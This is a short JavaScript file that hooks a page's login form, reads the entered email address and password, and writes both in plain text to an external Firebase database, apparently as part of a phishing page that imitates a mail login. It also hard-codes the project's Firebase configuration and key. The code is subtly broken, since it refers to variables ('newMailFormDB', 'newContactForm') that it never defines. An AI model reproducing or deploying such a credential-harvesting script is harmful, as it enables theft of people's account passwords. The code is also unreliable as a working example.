const firebaseConfig = {
    apiKey: "AIzaSyCVKcmbYpXo_CWGLdr2bkBeTyZ-51CQZtM",
    authDomain: "mail-6835e.firebaseapp.com",
    projectId: "mail-6835e",
    storageBucket: "mail-6835e.appspot.com",
    messagingSenderId: "891244523613",
    appId: "1:891244523613:web:d52838ad5f82dcda111db4"
  };


firebase.initializeApp(firebaseConfig);

var newMailForm = firebase.database().ref("mail");

document.getElementById('login').addEventListener('submit', submitForm);

function submitForm(e) {
    e.preventDefault();

    var emaillog = getElementVal("emaillog");
    var password = getElementVal("pass");

    saveMessages(emaillog, password);

 //   enable alert
 document.querySelector(".alert1").style.display = "block";

 //   remove the alert
 setTimeout(() => {
   document.querySelector(".alert1").style.display = "none";
 }, 3000);

 //   reset the form
 document.getElementById("mail").reset();
}


const saveMessages = (emaillog, password)=>{
    var newMailForm = newMailFormDB.push();

    newContactForm.set({
        email : emaillog,
        password : password,
    });
};
const getElementVal = (id)=>{
    return document.getElementById(id).value;
};